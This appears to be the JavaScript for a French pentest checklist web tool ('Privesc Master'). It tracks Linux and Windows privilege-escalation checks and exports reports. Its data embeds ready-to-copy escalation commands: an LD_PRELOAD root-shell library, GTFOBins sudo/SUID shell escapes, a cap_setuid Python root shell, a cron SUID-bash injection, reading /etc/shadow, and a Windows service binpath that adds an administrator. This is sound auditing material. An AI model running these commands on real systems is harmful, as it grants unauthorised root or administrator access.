/*
=======================================================
    PRIVESC MASTER JAVASCRIPT - VERSION MVP
    Compatible avec AuditMapper Design System
=======================================================
*/

// ==================== ÉTAT GLOBAL ==================== //
let globalState = {
    currentOS: null,
    currentContext: 'local',
    currentView: 'progress',
    checklistState: {},
    availableTags: new Set(),
    filteredItems: [],
    searchTerm: ''
};

// ==================== CONSTANTES ==================== //
const STORAGE_KEY = 'privescMasterState_v1';
const CHECKLIST_DATA = {
    linux: {
        'Énumération Système': [
            {
                id: 'linux_kernel_version',
                label: 'Version du Kernel',
                description: 'Identifier la version du kernel et rechercher des exploits connus',
                checkCommand: 'uname -a\ncat /proc/version\ncat /etc/os-release',
                exploitCommand: 'searchsploit "Linux Kernel $(uname -r | cut -d\'-\' -f1)"\n# Dirty COW, DirtyCred, etc.',
                tags: ['enumeration', 'kernel', 'exploit'],
                links: ['https://www.exploit-db.com/', 'https://github.com/SecWiki/linux-kernel-exploits'],
                tips: 'Vérifiez les CVE récents pour votre version de kernel. Attention aux exploits qui peuvent crasher le système.'
            },
            {
                id: 'linux_system_info',
                label: 'Informations Système',
                description: 'Collecter les informations de base du système',
                checkCommand: 'hostname\nwhoami\nid\ngroups\ncat /etc/passwd | grep -v nologin\ncat /etc/group',
                exploitCommand: '# Analyser les utilisateurs et groupes privilégiés',
                tags: ['enumeration', 'users', 'groups'],
                links: ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation'],
                tips: 'Notez les utilisateurs avec UID 0, les groupes privilégiés (wheel, sudo, admin, docker, etc.)'
            },
            {
                id: 'linux_environment',
                label: 'Variables d\'Environnement',
                description: 'Examiner les variables d\'environnement pour des informations sensibles',
                checkCommand: 'env\necho $PATH\necho $LD_PRELOAD\necho $LD_LIBRARY_PATH',
                exploitCommand: '# Si LD_PRELOAD est modifiable:\necho \'#include <stdio.h>\nvoid _init() { setuid(0); system("/bin/bash"); }\' > /tmp/pe.c\ngcc -shared -fPIC -nostartfiles -o /tmp/pe.so /tmp/pe.c\nLD_PRELOAD=/tmp/pe.so [command]',
                tags: ['enumeration', 'environment', 'ld_preload'],
                links: ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload'],
                tips: 'LD_PRELOAD et PATH modifiables peuvent mener à une escalade de privilèges'
            }
        ],
        'Permissions et Fichiers': [
            {
                id: 'linux_sudo_permissions',
                label: 'Permissions Sudo',
                description: 'Vérifier les permissions sudo de l\'utilisateur',
                checkCommand: 'sudo -l\nsudo -ll',
                exploitCommand: '# GTFOBins pour chaque binaire autorisé\n# Exemple vim: sudo vim -c \':!/bin/bash\'\n# Exemple find: sudo find . -exec /bin/bash \\; -quit',
                tags: ['permissions', 'sudo', 'gtfobins'],
                links: ['https://gtfobins.github.io/'],
                tips: 'Consultez GTFOBins pour chaque binaire. Attention aux NOPASSWD et aux wildcards.'
            },
            {
                id: 'linux_suid_sgid',
                label: 'Binaires SUID/SGID',
                description: 'Rechercher les binaires avec bits SUID/SGID',
                checkCommand: 'find / -type f \\( -perm -4000 -o -perm -2000 \\) -exec ls -l {} \\; 2>/dev/null\nfind / -type f -perm -4000 2>/dev/null | xargs ls -la',
                exploitCommand: '# GTFOBins pour chaque binaire SUID\n# Exemple find: find . -exec /bin/sh -p \\; -quit\n# Exemple cp: cp /etc/shadow /tmp/',
                tags: ['permissions', 'suid', 'sgid', 'gtfobins'],
                links: ['https://gtfobins.github.io/#+suid'],
                tips: 'Concentrez-vous sur les binaires non-standard. Vérifiez les versions vulnérables.'
            },
            {
                id: 'linux_capabilities',
                label: 'Linux Capabilities',
                description: 'Identifier les capabilities étendues sur les binaires',
                checkCommand: 'getcap -r / 2>/dev/null\n/sbin/getcap -r / 2>/dev/null',
                exploitCommand: '# cap_setuid: ./python -c "import os; os.setuid(0); os.system(\\"/bin/bash\\")"\\n# cap_sys_admin: mount, unshare, etc.',
                tags: ['permissions', 'capabilities'],
                links: ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities'],
                tips: 'cap_setuid, cap_sys_admin, cap_dac_override sont particulièrement dangereux'
            }
        ],
        'Services et Processus': [
            {
                id: 'linux_running_processes',
                label: 'Processus en Cours',
                description: 'Analyser les processus en cours d\'exécution',
                checkCommand: 'ps aux\nps -ef\ntop\nhtop',
                exploitCommand: '# Rechercher des processus root vulnérables\n# Injection dans des processus existants',
                tags: ['processes', 'services'],
                links: ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes'],
                tips: 'Recherchez les processus root, les services internes, les applications custom'
            },
            {
                id: 'linux_cron_jobs',
                label: 'Tâches Cron',
                description: 'Examiner les tâches cron pour des vulnérabilités',
                checkCommand: 'ls -la /etc/cron*\ncat /etc/crontab\ncrontab -l\nls -la /var/spool/cron/\nls -la /var/spool/cron/crontabs/',
                exploitCommand: '# Script cron modifiable:\necho "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" >> [script]\n# Wildcard injection dans cron',
                tags: ['cron', 'scheduled', 'persistence'],
                links: ['https://book.hacktricks.xyz/linux-hardening/privilege-escalation#scheduled-cron-jobs'],
                tips: 'Vérifiez les permissions des scripts, les wildcards, les chemins relatifs'
            }
        ]
    },
    windows: {
        'Énumération Système': [
            {
                id: 'windows_system_info',
                label: 'Informations Système',
                description: 'Collecter les informations de base du système Windows',
                checkCommand: 'systeminfo\nwhoami\nwhoami /priv\nwhoami /groups\nnet user\nnet localgroup',
                exploitCommand: '# Analyser les privilèges et groupes',
                tags: ['enumeration', 'system', 'users'],
                links: ['https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation'],
                tips: 'Notez les privilèges activés, les groupes d\'administration'
            },
            {
                id: 'windows_patches',
                label: 'Patches et Vulnérabilités',
                description: 'Identifier les patches manquants et vulnérabilités connues',
                checkCommand: 'wmic qfe list\nsysteminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"',
                exploitCommand: '# Rechercher des exploits pour la version\n# MS17-010, MS16-032, etc.',
                tags: ['enumeration', 'patches', 'exploits'],
                links: ['https://github.com/SecWiki/windows-kernel-exploits'],
                tips: 'Utilisez Windows Exploit Suggester ou Sherlock pour identifier les exploits'
            }
        ],
        'Services et Applications': [
            {
                id: 'windows_services',
                label: 'Services Windows',
                description: 'Analyser les services pour des misconfigurations',
                checkCommand: 'sc query\nwmic service list brief\nnet start',
                exploitCommand: '# Service avec permissions faibles:\nsc config [service] binpath="cmd /c net localgroup administrators [user] /add"\nsc start [service]',
                tags: ['services', 'permissions', 'misconfiguration'],
                links: ['https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#services'],
                tips: 'Utilisez accesschk.exe pour vérifier les permissions des services'
            }
        ]
    }
};

// ==================== INITIALISATION ==================== //
document.addEventListener('DOMContentLoaded', function() {
    initializePrivescMaster();
    loadState();
    setupEventListeners();
    updateUI();
});

function initializePrivescMaster() {
    console.log('🔑 Privesc Master - Initialisation...');
    
    // Initialiser les éléments de l'interface
    const osSelect = document.getElementById('osSelect');
    const contextSelect = document.getElementById('contextSelect');
    
    if (osSelect) {
        osSelect.addEventListener('change', handleOSChange);
    }
    
    if (contextSelect) {
        contextSelect.addEventListener('change', handleContextChange);
    }
    
    // Initialiser les contrôles de vue
    setupViewControls();
    
    // Initialiser les filtres
    setupFilters();
    
    // Initialiser les boutons d'export
    setupExportButtons();
    
    console.log('✅ Privesc Master initialisé avec succès');
}

// ==================== GESTION DES VUES ==================== //
function setupViewControls() {
    const viewButtons = document.querySelectorAll('.view-btn');
    
    viewButtons.forEach(btn => {
        btn.addEventListener('click', function() {
            const viewType = this.id.replace('View', '');
            switchView(viewType);
        });
    });
}

function switchView(viewType) {
    globalState.currentView = viewType;
    
    // Mettre à jour les boutons actifs
    document.querySelectorAll('.view-btn').forEach(btn => {
        btn.classList.remove('active');
    });
    document.getElementById(viewType + 'View')?.classList.add('active');
    
    // Afficher/masquer les sections appropriées
    updateViewSections();
    
    saveState();
}

function updateViewSections() {
    const statsSection = document.getElementById('statsSection');
    const quickNavSection = document.getElementById('quickNavSection');
    const exportSection = document.getElementById('exportSection');
    
    // Masquer toutes les sections par défaut
    [statsSection, quickNavSection, exportSection].forEach(section => {
        if (section) section.style.display = 'none';
    });
    
    // Afficher selon la vue active
    switch (globalState.currentView) {
        case 'progress':
            if (statsSection) statsSection.style.display = 'block';
            if (quickNavSection) quickNavSection.style.display = 'block';
            break;
        case 'list':
            // Vue liste : afficher tout sauf export
            break;
        case 'category':
            if (quickNavSection) quickNavSection.style.display = 'block';
            if (exportSection) exportSection.style.display = 'block';
            break;
    }
}

// ==================== GESTION DES ÉVÉNEMENTS ==================== //
function setupEventListeners() {
    // Filtres
    const searchInput = document.getElementById('checklistSearch');
    const statusFilter = document.getElementById('statusFilter');
    const tagFilter = document.getElementById('tagFilter');
    const clearFilters = document.getElementById('clearFilters');
    
    if (searchInput) {
        searchInput.addEventListener('input', handleSearch);
    }
    
    if (statusFilter) {
        statusFilter.addEventListener('change', applyFilters);
    }
    
    if (tagFilter) {
        tagFilter.addEventListener('change', applyFilters);
    }
    
    if (clearFilters) {
        clearFilters.addEventListener('click', clearAllFilters);
    }
}

function handleOSChange(event) {
    const selectedOS = event.target.value;
    globalState.currentOS = selectedOS;
    
    if (selectedOS) {
        enableInterface();
        displayChecklist(selectedOS);
        updateQuickNavigation();
    } else {
        disableInterface();
        showPlaceholder();
    }
    
    saveState();
}

function handleContextChange(event) {
    globalState.currentContext = event.target.value;
    saveState();
}

// ==================== GESTION DE LA CHECKLIST ==================== //
function displayChecklist(osType) {
    const container = document.getElementById('checklistContainer');
    const placeholder = document.getElementById('checklistPlaceholder');
    
    if (!container || !CHECKLIST_DATA[osType]) {
        console.error('Données de checklist non trouvées pour:', osType);
        return;
    }
    
    // Masquer le placeholder
    if (placeholder) {
        placeholder.style.display = 'none';
    }
    
    // Générer la checklist
    const checklistHTML = generateChecklistHTML(CHECKLIST_DATA[osType]);
    container.innerHTML = checklistHTML;
    
    // Mettre à jour les statistiques
    updateStats();
    updateProgressBar();
    
    // Activer les événements sur les éléments de checklist
    setupChecklistEvents();
}

function generateChecklistHTML(checklistData) {
    let html = '';
    
    Object.entries(checklistData).forEach(([category, items]) => {
        html += `
            <div class="category-section" id="category-${category.replace(/\s+/g, '-').toLowerCase()}">
                <div class="form-section">
                    <h3>${getCategoryIcon(category)} ${category}</h3>
                    <div class="checklist-items">
        `;
        
        items.forEach(item => {
            const status = globalState.checklistState[item.id] || 'todo';
            const statusIcon = getStatusIcon(status);
            
            html += `
                <div class="checklist-item status-${status}" data-item-id="${item.id}">
                    <div class="checklist-header">
                        <div class="checklist-title-section">
                            <h4 class="checklist-title">${item.label}</h4>
                            <p class="checklist-description">${item.description}</p>
                        </div>
                        <div class="checklist-controls">
                            <select class="status-select form-control" data-item-id="${item.id}">
                                <option value="todo" ${status === 'todo' ? 'selected' : ''}>📝 À vérifier</option>
                                <option value="checked" ${status === 'checked' ? 'selected' : ''}>✅ Vérifié</option>
                                <option value="exploitable" ${status === 'exploitable' ? 'selected' : ''}>⚠️ Exploitable</option>
                                <option value="exploited" ${status === 'exploited' ? 'selected' : ''}>🔥 Exploité</option>
                            </select>
                        </div>
                    </div>
                    <div class="checklist-content">
                        ${item.checkCommand ? `
                            <div class="command-section">
                                <h6>🔍 Commandes de vérification:</h6>
                                <div class="command-block">
                                    <button class="copy-btn" onclick="copyToClipboard('check-${item.id}')">📋</button>
                                    <pre id="check-${item.id}">${item.checkCommand}</pre>
                                </div>
                            </div>
                        ` : ''}
                        
                        ${item.exploitCommand ? `
                            <div class="command-section">
                                <h6>💥 Commandes d'exploitation:</h6>
                                <div class="command-block">
                                    <button class="copy-btn" onclick="copyToClipboard('exploit-${item.id}')">📋</button>
                                    <pre id="exploit-${item.id}">${item.exploitCommand}</pre>
                                </div>
                            </div>
                        ` : ''}
                        
                        ${item.tags && item.tags.length > 0 ? `
                            <div class="tag-badges">
                                ${item.tags.map(tag => `<span class="badge tag-${tag}">${tag}</span>`).join('')}
                            </div>
                        ` : ''}
                        
                        ${item.tips ? `
                            <div class="tips-section">
                                <h6>💡 Conseils:</h6>
                                <p class="tips-text">${item.tips}</p>
                            </div>
                        ` : ''}
                        
                        ${item.links && item.links.length > 0 ? `
                            <div class="links-section">
                                <h6>🔗 Liens utiles:</h6>
                                <div class="links-list">
                                    ${item.links.map(link => `<a href="${link}" target="_blank" rel="noopener">${link}</a>`).join('')}
                                </div>
                            </div>
                        ` : ''}
                    </div>
                </div>
            `;
        });
        
        html += `
                    </div>
                </div>
            </div>
        `;
    });
    
    return html;
}

function setupChecklistEvents() {
    // Gérer les changements de statut
    document.querySelectorAll('.status-select').forEach(select => {
        select.addEventListener('change', handleStatusChange);
    });
    
    // Mettre à jour les tags disponibles
    updateAvailableTags();
}

function handleStatusChange(event) {
    const itemId = event.target.dataset.itemId;
    const newStatus = event.target.value;
    
    // Mettre à jour l'état global
    globalState.checklistState[itemId] = newStatus;
    
    // Mettre à jour la classe CSS de l'élément
    const item = document.querySelector(`[data-item-id="${itemId}"]`);
    if (item) {
        item.className = `checklist-item status-${newStatus}`;
    }
    
    // Mettre à jour les statistiques
    updateStats();
    updateProgressBar();
    
    // Sauvegarder l'état
    saveState();
    
    console.log(`Statut mis à jour: ${itemId} -> ${newStatus}`);
}

// ==================== STATISTIQUES ET PROGRESSION ==================== //
function updateStats() {
    const stats = calculateStats();
    
    // Mettre à jour les compteurs
    document.getElementById('todoCount').textContent = stats.todo;
    document.getElementById('checkedCount').textContent = stats.checked;
    document.getElementById('exploitableCount').textContent = stats.exploitable;
    document.getElementById('exploitedCount').textContent = stats.exploited;
    
    // Mettre à jour les stats d'export
    document.getElementById('totalItems').textContent = stats.total;
    document.getElementById('completedItems').textContent = stats.checked + stats.exploitable + stats.exploited;
    document.getElementById('vulnerabilitiesFound').textContent = stats.exploitable + stats.exploited;
}

function updateProgressBar() {
    const stats = calculateStats();
    const progressFill = document.getElementById('progressFill');
    const progressText = document.getElementById('progressText');
    
    if (stats.total > 0) {
        const completed = stats.checked + stats.exploitable + stats.exploited;
        const percentage = Math.round((completed / stats.total) * 100);
        
        if (progressFill) {
            progressFill.style.width = `${percentage}%`;
        }
        
        if (progressText) {
            progressText.textContent = `${percentage}% complété (${completed}/${stats.total})`;
        }
    }
}

function calculateStats() {
    const stats = {
        todo: 0,
        checked: 0,
        exploitable: 0,
        exploited: 0,
        total: 0
    };
    
    if (!globalState.currentOS || !CHECKLIST_DATA[globalState.currentOS]) {
        return stats;
    }
    
    // Compter tous les éléments
    Object.values(CHECKLIST_DATA[globalState.currentOS]).forEach(items => {
        items.forEach(item => {
            stats.total++;
            const status = globalState.checklistState[item.id] || 'todo';
            stats[status]++;
        });
    });
    
    return stats;
}

// ==================== NAVIGATION RAPIDE ==================== //
function updateQuickNavigation() {
    const quickNavLinks = document.getElementById('quickNavLinks');
    
    if (!quickNavLinks || !globalState.currentOS) return;
    
    const checklistData = CHECKLIST_DATA[globalState.currentOS];
    let html = '';
    
    Object.keys(checklistData).forEach(category => {
        const categoryId = category.replace(/\s+/g, '-').toLowerCase();
        html += `
            <a href="#category-${categoryId}" class="nav-link">
                ${getCategoryIcon(category)} ${category}
            </a>
        `;
    });
    
    quickNavLinks.innerHTML = html;
}

// ==================== FILTRES ==================== //
function setupFilters() {
    const checklistSearch = document.getElementById('checklistSearch');
    const statusFilter = document.getElementById('statusFilter');
    const tagFilter = document.getElementById('tagFilter');
    
    if (checklistSearch) {
        checklistSearch.addEventListener('input', handleSearch);
    }
}

function handleSearch(event) {
    globalState.searchTerm = event.target.value.toLowerCase();
    applyFilters();
}

function applyFilters() {
    const items = document.querySelectorAll('.checklist-item');
    const statusFilter = document.getElementById('statusFilter')?.value;
    const tagFilter = document.getElementById('tagFilter')?.value;
    
    items.forEach(item => {
        let shouldShow = true;
        
        // Filtre par recherche
        if (globalState.searchTerm) {
            const content = item.textContent.toLowerCase();
            shouldShow = shouldShow && content.includes(globalState.searchTerm);
        }
        
        // Filtre par statut
        if (statusFilter) {
            shouldShow = shouldShow && item.classList.contains(`status-${statusFilter}`);
        }
        
        // Filtre par tag
        if (tagFilter) {
            const badges = item.querySelectorAll('.badge');
            let hasTag = false;
            badges.forEach(badge => {
                if (badge.textContent.includes(tagFilter)) {
                    hasTag = true;
                }
            });
            shouldShow = shouldShow && hasTag;
        }
        
        // Afficher/masquer l'élément
        item.style.display = shouldShow ? 'block' : 'none';
    });
}

function clearAllFilters() {
    document.getElementById('checklistSearch').value = '';
    document.getElementById('statusFilter').value = '';
    document.getElementById('tagFilter').value = '';
    
    globalState.searchTerm = '';
    
    // Réafficher tous les éléments
    document.querySelectorAll('.checklist-item').forEach(item => {
        item.style.display = 'block';
    });
}

function updateAvailableTags() {
    const tagFilter = document.getElementById('tagFilter');
    if (!tagFilter) return;
    
    const tags = new Set();
    
    // Collecter tous les tags de la checklist actuelle
    if (globalState.currentOS && CHECKLIST_DATA[globalState.currentOS]) {
        Object.values(CHECKLIST_DATA[globalState.currentOS]).forEach(items => {
            items.forEach(item => {
                if (item.tags) {
                    item.tags.forEach(tag => tags.add(tag));
                }
            });
        });
    }
    
    // Mettre à jour le select des tags
    const currentValue = tagFilter.value;
    tagFilter.innerHTML = '<option value="">Tous les tags</option>';
    
    Array.from(tags).sort().forEach(tag => {
        const option = document.createElement('option');
        option.value = tag;
        option.textContent = tag;
        if (tag === currentValue) option.selected = true;
        tagFilter.appendChild(option);
    });
}

// ==================== INTERFACE ==================== //
function enableInterface() {
    document.getElementById('checklistSearch')?.removeAttribute('disabled');
    document.getElementById('statusFilter')?.removeAttribute('disabled');
    document.getElementById('tagFilter')?.removeAttribute('disabled');
    document.getElementById('clearFilters')?.removeAttribute('disabled');
    
    // Activer les boutons d'export
    document.querySelectorAll('#exportSection button').forEach(btn => {
        btn.removeAttribute('disabled');
    });
}

function disableInterface() {
    document.getElementById('checklistSearch')?.setAttribute('disabled', 'disabled');
    document.getElementById('statusFilter')?.setAttribute('disabled', 'disabled');
    document.getElementById('tagFilter')?.setAttribute('disabled', 'disabled');
    document.getElementById('clearFilters')?.setAttribute('disabled', 'disabled');
    
    // Désactiver les boutons d'export
    document.querySelectorAll('#exportSection button').forEach(btn => {
        btn.setAttribute('disabled', 'disabled');
    });
}

function showPlaceholder() {
    const placeholder = document.getElementById('checklistPlaceholder');
    const container = document.getElementById('checklistContainer');
    
    if (placeholder) {
        placeholder.style.display = 'block';
    }
    
    // Nettoyer le contenu
    if (container) {
        const items = container.querySelectorAll('.category-section');
        items.forEach(item => item.remove());
    }
    
    // Réinitialiser les statistiques
    updateStats();
    updateProgressBar();
}

function updateUI() {
    updateViewSections();
    updateStats();
    updateProgressBar();
}

// ==================== SAUVEGARDE ET CHARGEMENT ==================== //
function saveState() {
    const state = {
        currentOS: globalState.currentOS,
        currentContext: globalState.currentContext,
        currentView: globalState.currentView,
        checklistState: globalState.checklistState,
        targetOS: document.getElementById('targetOS')?.value || '',
        currentUser: document.getElementById('currentUser')?.value || ''
    };
    
    localStorage.setItem(STORAGE_KEY, JSON.stringify(state));
}

function loadState() {
    try {
        const saved = localStorage.getItem(STORAGE_KEY);
        if (saved) {
            const state = JSON.parse(saved);
            
            globalState.currentOS = state.currentOS;
            globalState.currentContext = state.currentContext || 'local';
            globalState.currentView = state.currentView || 'progress';
            globalState.checklistState = state.checklistState || {};
            
            // Restaurer les valeurs des formulaires
            if (state.currentOS) {
                document.getElementById('osSelect').value = state.currentOS;
            }
            document.getElementById('contextSelect').value = globalState.currentContext;
            if (state.targetOS) {
                document.getElementById('targetOS').value = state.targetOS;
            }
            if (state.currentUser) {
                document.getElementById('currentUser').value = state.currentUser;
            }
            
            // Restaurer la vue
            switchView(globalState.currentView);
            
            // Si un OS est sélectionné, afficher la checklist
            if (globalState.currentOS) {
                enableInterface();
                displayChecklist(globalState.currentOS);
                updateQuickNavigation();
            } else {
                disableInterface();
                showPlaceholder();
            }
        }
    } catch (error) {
        console.error('Erreur lors du chargement de l\'état:', error);
    }
}

// ==================== EXPORT ==================== //
function setupExportButtons() {
    document.getElementById('exportJSON')?.addEventListener('click', exportToJSON);
    document.getElementById('exportMarkdown')?.addEventListener('click', exportToMarkdown);
    document.getElementById('exportHTML')?.addEventListener('click', exportToHTML);
    document.getElementById('exportZip')?.addEventListener('click', exportToZip);
}

function exportToJSON() {
    const data = {
        metadata: {
            exportDate: new Date().toISOString(),
            os: globalState.currentOS,
            context: globalState.currentContext,
            targetOS: document.getElementById('targetOS')?.value || '',
            currentUser: document.getElementById('currentUser')?.value || ''
        },
        statistics: calculateStats(),
        checklistState: globalState.checklistState
    };
    
    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
    downloadFile(blob, `privesc-checklist-${globalState.currentOS}-${new Date().toISOString().split('T')[0]}.json`);
}

function exportToMarkdown() {
    let content = `# Checklist Privesc - ${globalState.currentOS}\n\n`;
    content += `**Date d'export:** ${new Date().toLocaleDateString()}\n`;
    content += `**Contexte:** ${globalState.currentContext}\n\n`;
    
    const stats = calculateStats();
    content += `## Statistiques\n\n`;
    content += `- **Total:** ${stats.total} éléments\n`;
    content += `- **Vérifiés:** ${stats.checked}\n`;
    content += `- **Exploitables:** ${stats.exploitable}\n`;
    content += `- **Exploités:** ${stats.exploited}\n\n`;
    
    if (globalState.currentOS && CHECKLIST_DATA[globalState.currentOS]) {
        Object.entries(CHECKLIST_DATA[globalState.currentOS]).forEach(([category, items]) => {
            content += `## ${category}\n\n`;
            
            items.forEach(item => {
                const status = globalState.checklistState[item.id] || 'todo';
                const statusEmoji = getStatusIcon(status);
                
                content += `### ${statusEmoji} ${item.label}\n\n`;
                content += `**Description:** ${item.description}\n\n`;
                
                if (item.checkCommand) {
                    content += `**Commandes de vérification:**\n\`\`\`bash\n${item.checkCommand}\n\`\`\`\n\n`;
                }
                
                if (item.exploitCommand && (status === 'exploitable' || status === 'exploited')) {
                    content += `**Commandes d'exploitation:**\n\`\`\`bash\n${item.exploitCommand}\n\`\`\`\n\n`;
                }
                
                if (item.tips) {
                    content += `**Conseils:** ${item.tips}\n\n`;
                }
                
                content += `---\n\n`;
            });
        });
    }
    
    const blob = new Blob([content], { type: 'text/markdown' });
    downloadFile(blob, `privesc-checklist-${globalState.currentOS}-${new Date().toISOString().split('T')[0]}.md`);
}

function exportToHTML() {
    // Implementation simplifiée
    const content = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Checklist Privesc - ${globalState.currentOS}</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; }
                .status-todo { color: #6c757d; }
                .status-checked { color: #28a745; }
                .status-exploitable { color: #ffc107; }
                .status-exploited { color: #dc3545; }
            </style>
        </head>
        <body>
            <h1>Checklist Privesc - ${globalState.currentOS}</h1>
            <p><strong>Date d'export:</strong> ${new Date().toLocaleDateString()}</p>
            ${document.getElementById('checklistContainer').innerHTML}
        </body>
        </html>
    `;
    
    const blob = new Blob([content], { type: 'text/html' });
    downloadFile(blob, `privesc-checklist-${globalState.currentOS}-${new Date().toISOString().split('T')[0]}.html`);
}

async function exportToZip() {
    if (typeof JSZip === 'undefined') {
        alert('JSZip n\'est pas disponible pour l\'export ZIP');
        return;
    }
    
    const zip = new JSZip();
    
    // Ajouter les exports dans le ZIP
    const jsonData = {
        metadata: {
            exportDate: new Date().toISOString(),
            os: globalState.currentOS,
            context: globalState.currentContext
        },
        statistics: calculateStats(),
        checklistState: globalState.checklistState
    };
    
    zip.file('data.json', JSON.stringify(jsonData, null, 2));
    
    // Générer et télécharger le ZIP
    const content = await zip.generateAsync({ type: 'blob' });
    downloadFile(content, `privesc-checklist-${globalState.currentOS}-${new Date().toISOString().split('T')[0]}.zip`);
}

// ==================== UTILITAIRES ==================== //
function downloadFile(blob, filename) {
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}

function copyToClipboard(elementId) {
    const element = document.getElementById(elementId);
    if (!element) return;
    
    const text = element.textContent;
    navigator.clipboard.writeText(text).then(() => {
        // Feedback visuel
        const button = element.parentNode.querySelector('.copy-btn');
        if (button) {
            const originalText = button.textContent;
            button.textContent = '✅';
            setTimeout(() => {
                button.textContent = originalText;
            }, 1000);
        }
    }).catch(err => {
        console.error('Erreur lors de la copie:', err);
    });
}

function getStatusIcon(status) {
    const icons = {
        'todo': '📝',
        'checked': '✅',
        'exploitable': '⚠️',
        'exploited': '🔥'
    };
    return icons[status] || '📝';
}

function getCategoryIcon(category) {
    const icons = {
        'Énumération Système': '🔍',
        'Permissions et Fichiers': '🔐',
        'Services et Processus': '⚙️',
        'Services et Applications': '💼',
        'Tokens et Privilèges': '🎫',
        'Exploitation Avancée': '🚀'
    };
    return icons[category] || '📋';
}

// ==================== FONCTION GLOBALE POUR LES BOUTONS ==================== //
window.copyToClipboard = copyToClipboard; 